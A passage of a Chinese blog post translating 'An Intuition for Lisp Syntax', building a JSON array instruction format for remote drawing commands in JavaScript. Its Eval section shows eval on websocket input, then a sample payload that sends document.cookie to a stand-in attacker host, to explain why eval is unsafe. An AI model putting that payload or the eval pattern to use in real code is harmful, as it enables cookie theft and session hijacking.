<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>【译】Lisp语法的直观解释 | Lishunyang&#39;s Blog</title>
    <meta name="generator" content="VuePress 1.9.10">
    <link rel="icon" type="image/png" href="/blog/favicon.png">
    <meta name="description" content="Lishunyang&#39;s Blog">
    <meta name="keywords" content="Javascript,HTTP,Nodejs,React">
    
    <link rel="preload" href="/blog/assets/css/0.styles.102d8b8d.css" as="style"><link rel="preload" href="/blog/assets/js/app.dfbb514b.js" as="script"><link rel="preload" href="/blog/assets/js/2.e0432708.js" as="script"><link rel="preload" href="/blog/assets/js/46.9ecb7d6c.js" as="script">
    <link rel="stylesheet" href="/blog/assets/css/0.styles.102d8b8d.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div data-v-ad494eec><ul class="container" data-v-26d88251 data-v-ad494eec><li class="title" data-v-26d88251><a href="/blog/" data-v-26d88251><img src="/blog/assets/img/avatar.cf743a85.jpg" class="avatar" data-v-26d88251>Lishunyang's Blog</a></li> <li class="item" data-v-26d88251><a href="/about.html" data-v-26d88251>About</a></li></ul> <div class="main" data-v-ad494eec><div class="container" data-v-63da4bd6 data-v-ad494eec><div class="header" data-v-63da4bd6><h1 class="title" data-v-63da4bd6>【译】Lisp语法的直观解释</h1> <div class="date-and-tags" data-v-63da4bd6><span class="date" data-v-63da4bd6>2020/11/8</span> <span class="tags" data-v-63da4bd6><span class="tag" data-v-63da4bd6>meta-programming</span><span class="tag" data-v-63da4bd6>programming-language</span><span class="tag" data-v-63da4bd6>javascript</span><span class="tag" data-v-63da4bd6>lisp</span></span></div></div> <ul class="sidebar" data-v-63da4bd6><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#画图" data-v-63da4bd6>画图</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#挑战" data-v-63da4bd6>挑战</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#eval" data-v-63da4bd6>Eval</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#最初的想法" data-v-63da4bd6>最初的想法</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#一个小简化" data-v-63da4bd6>一个小简化</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#更多功能" data-v-63da4bd6>更多功能</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#再简化一点" data-v-63da4bd6>再简化一点</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#更牛啤一点" data-v-63da4bd6>更牛啤一点</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#无敌牛啤：目标" data-v-63da4bd6>无敌牛啤：目标</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#无敌牛啤：关键" data-v-63da4bd6>无敌牛啤：关键</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#无敌牛啤：执行" data-v-63da4bd6>无敌牛啤：执行</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#试试看" data-v-63da4bd6>试试看</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#惊喜" data-v-63da4bd6>惊喜</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#没什么特殊的" data-v-63da4bd6>没什么特殊的</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#code-is-data" data-v-63da4bd6>Code is Data</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#structual-editing" data-v-63da4bd6>Structual editing</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#我们发现了什么？" data-v-63da4bd6>我们发现了什么？</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#发现？" data-v-63da4bd6>发现？</a></li><li class="sidebar-item" data-v-63da4bd6><a href="/2020/11/an-intuition-for-list-syntax.html#最后" data-v-63da4bd6>最后</a></li></ul> <div class="content" data-v-63da4bd6><div class="content__default" data-v-63da4bd6><p>本文翻译自<a href="https://stopa.io/post/265" target="_blank" rel="noopener noreferrer">An Intuition for Lisp Syntax<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>最初是在Hackernews上看到的，觉得非常有意思，于是就忍不住翻译过来了，以下是正文。</p> <hr> <p>我认识的每一个Lisp程序员，包括我自己，都觉得Lisp语法里的那些括号太多了而且很奇怪。当然，这只是最开始的时候，因为很快我们就都达成了一个共识：Lisp的牛逼之处正是源自于那些括号！</p> <p>在这篇文章中，我们就来仔细聊聊这个话题。</p> <h2 id="画图"><a href="#画图" class="header-anchor">#</a> 画图</h2> <p>假设我们现在正在编写一个能够让用户画图的程序。如果我们使用javascript，代码差不多就是这样：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token function">drawPoint</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'yellow'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">drawLine</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'blue'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">drawCircle</span><span class="token punctuation">(</span>point<span class="token punctuation">,</span> radius<span class="token punctuation">,</span> <span class="token string">'red'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">rotate</span><span class="token punctuation">(</span>shape<span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span>
</code></pre></div><p>目前看着还行。</p> <h2 id="挑战"><a href="#挑战" class="header-anchor">#</a> 挑战</h2> <p>现在问题来了：我们能够支持远程画图吗？</p> <p>也就是让用户“发送”画图的指令到其他人的电脑，然后在他们的电脑屏幕上完成画图的过程。</p> <p>怎么做呢？</p> <p>很自然的想法是，我们可以建立一个websocket链接，然后可以像下面这样去接收用户的画图指令：</p> <div class="language-js extra-class"><pre class="language-js"><code>websocket<span class="token punctuation">.</span><span class="token function">onMessage</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token comment">// TODO</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><h2 id="eval"><a href="#eval" class="header-anchor">#</a> Eval</h2> <p>为了能够执行画图指令，最简单的做法就是使用eval：</p> <div class="language-js extra-class"><pre class="language-js"><code>webSocket<span class="token punctuation">.</span><span class="token function">onMessage</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token function">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>现在，用户只要发送<code>&quot;drawLine({ x: 0, y: 0 }, { x: 1, y: 1 }, 'red')&quot;</code>，然后，啪：一条线就画出来了！</p> <p>但是。。你可能已经有一些邪恶的小想法了。如果用户不怀好意，发送的指令是一些恶意代码，比如下面这个：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token string">&quot;window.location='http://iwillp3wn.com?user_info=' + document.cookie;&quot;</span>
</code></pre></div><p>啊这。。那么我们的cookie就会被立即发送到iwillp3wn.com，然后我们可能就真的被入侵了。我们不能使用eval，这太危险了。</p> <blockquote><p>pwn：黑客俚语，意思是入侵、攻破或者控制</p></blockquote> <p>所以，现在问题来了：不能使用<code>eval</code>，我们需要另一种方式来接收画图指令。</p> <h2 id="最初的想法"><a href="#最初的想法" class="header-anchor">#</a> 最初的想法</h2> <p>好吧，一个最简单的想法就是使用JSON。我们可以将指令按照约定的格式组织成JSON，执行的时候调用对应的方法，这样就避免任意执行恶意代码了，就像下面这样一个JSON：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">{</span>
  <span class="token literal-property property">instructions</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
      <span class="token literal-property property">functionName</span><span class="token operator">:</span> <span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span>
      <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;blue&quot;</span> <span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre></div><p>上面这个JSON的会被转换成<code>drawLine({ x: 0, y: 0 }, { x: 1, y: 1}, 'blue')</code></p> <p>而这个转换过程实现起来也很容易：</p> <div class="language-js extra-class"><pre class="language-js"><code>webSocket<span class="token punctuation">.</span><span class="token function">onMessage</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> instructions <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> fns <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">drawLine</span><span class="token operator">:</span> drawLine<span class="token punctuation">,</span>
    <span class="token operator">...</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  instructions<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">ins</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    fns<span class="token punctuation">[</span>ins<span class="token punctuation">.</span>functionName<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>ins<span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>看上去也还凑合！</p> <h2 id="一个小简化"><a href="#一个小简化" class="header-anchor">#</a> 一个小简化</h2> <p>现在让我们在回过头看看上面的过程能不能再简化一点。这是我们的JSON：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">{</span>
  <span class="token property">&quot;instructions&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
      <span class="token property">&quot;functionName&quot;</span><span class="token operator">:</span> <span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span>
      <span class="token property">&quot;args&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;blue&quot;</span> <span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre></div><p>可以看到，既然每条指令都需要一个functionName和args，那这两个就可以省略了，所以我们可以把JSON简化成这样：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">{</span>
  <span class="token string-property property">&quot;instructions&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">[</span>
      <span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span>
      <span class="token punctuation">{</span> <span class="token string-property property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string-property property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token punctuation">{</span> <span class="token string-property property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string-property property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">&quot;blue&quot;</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre></div><p>太棒了，现在我们把指令换成了数组的写法，剩下的就是调整我们的指令解析器，规则很简单：每一个指令的第一项是函数名，剩下的是参数。如果我们写出来，就会是这个样子：</p> <div class="language-js extra-class"><pre class="language-js"><code>webSocket<span class="token punctuation">.</span><span class="token function">onMessage</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> instructions <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> fns <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">drawLine</span><span class="token operator">:</span> drawLine<span class="token punctuation">,</span>
    <span class="token operator">...</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  instructions<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">[</span> fName<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">]</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    fns<span class="token punctuation">[</span>fName<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>啪！<code>drawLine</code>又能够正常工作了！</p> <h2 id="更多功能"><a href="#更多功能" class="header-anchor">#</a> 更多功能</h2> <p>到目前为止，我们只使用了<code>drawLine</code>：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token function">drawLine</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'blue'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 等价于</span>
<span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token string-property property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string-property property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token string-property property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string-property property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre></div><p>如果我们想支持更复杂的场景，比如：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token function">rotate</span><span class="token punctuation">(</span><span class="token function">drawLine</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'blue'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>似乎看上去可以转换成这样：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span><span class="token string">&quot;rotate&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;blue&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span>
</code></pre></div><p>也就是说，<code>rotate</code>这个指令的第一个参数又是一个指令！哈，看上去很不错，而且更加不可思议的是，我们只需要稍微扩展一下之前的指令解析器就可以支持这样的写法了：</p> <div class="language-js extra-class"><pre class="language-js"><code>webSocket<span class="token punctuation">.</span><span class="token function">onMessage</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> instructions <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> fns <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">drawLine</span><span class="token operator">:</span> drawLine<span class="token punctuation">,</span>
    <span class="token operator">...</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token function-variable function">parseInstruction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ins</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>ins<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 这正情况下，ins一定是原始的参数，例如 { x: 0, y: 0 }</span>
      <span class="token keyword">return</span> ins<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">const</span> <span class="token punctuation">[</span>fName<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">]</span> <span class="token operator">=</span> ins<span class="token punctuation">;</span>
    <span class="token keyword">return</span> fns<span class="token punctuation">[</span>fName<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>parseInstruction<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  instructions<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>parseInstruction<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>这里，我们新增了一个叫<code>parseInstruction</code>的函数，通过对参数进行递归调用，我们现在就可以支持下面这种指令了：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span><span class="token string">&quot;rotate&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;rotate&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;blue&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">]</span>
</code></pre></div><p>针不戳！</p> <h2 id="再简化一点"><a href="#再简化一点" class="header-anchor">#</a> 再简化一点</h2> <p>好了，现在让我们再看看我们的JSON：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">{</span> <span class="token property">&quot;instructions&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;blue&quot;</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">}</span>
</code></pre></div><p>嗯，既然JSON对象中只包含instructions这一个key，那我们是不是可以把它省略掉呢？</p> <p>假如我们这样做：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span><span class="token string">&quot;do&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre></div><p>这里我们将那个冗长的instructions替换成了一个特殊的命令叫做<code>do</code>，意思是执行后续所有的命令。</p> <p>现在我们只需要再稍微调整一下我们的解析器：</p> <div class="language-js extra-class"><pre class="language-js"><code>webSocket<span class="token punctuation">.</span><span class="token function">onMessage</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">instructions</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> fns <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token operator">...</span><span class="token punctuation">,</span>
    <span class="token comment">// do总是会将最后一个命令得到的结果作为返回值</span>
    <span class="token function-variable function">do</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> args<span class="token punctuation">[</span>args<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token function-variable function">parseInstruction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ins</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>ins<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 此时一定是原始类型，例如 { x: 0, y: 0 }</span>
      <span class="token keyword">return</span> ins<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>fName<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">]</span> <span class="token operator">=</span> ins<span class="token punctuation">;</span>
    <span class="token keyword">return</span> fns<span class="token punctuation">[</span>fName<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>parseInstruction<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">parseInstruction</span><span class="token punctuation">(</span>instructions<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>wow，挺容易的。我们只是在<code>fns</code>里添加了<code>do</code>的定义。现在我们可以支持下面这样的命令了：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span>
  <span class="token string">&quot;do&quot;</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;drawPoint&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;rotate&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span>
<span class="token punctuation">]</span>
